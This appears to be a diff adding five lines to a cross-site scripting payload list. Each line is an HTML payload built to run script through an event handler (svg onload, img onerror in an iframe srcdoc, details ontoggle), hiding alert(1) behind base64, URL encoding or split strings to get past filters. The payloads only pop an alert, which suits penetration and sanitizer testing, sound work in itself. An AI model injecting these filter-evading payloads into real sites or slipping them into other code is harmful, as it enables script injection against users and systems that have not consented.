@@ -1,0 +1,5 @@
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc='<img src=x onerror=eval(decodeURIComponent("%61%6C%65%72%74(1)"))>'></iframe>
+<details open ontoggle=eval('window["al"+"ert"](1)')>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload=window['al'+'ert'](1)>
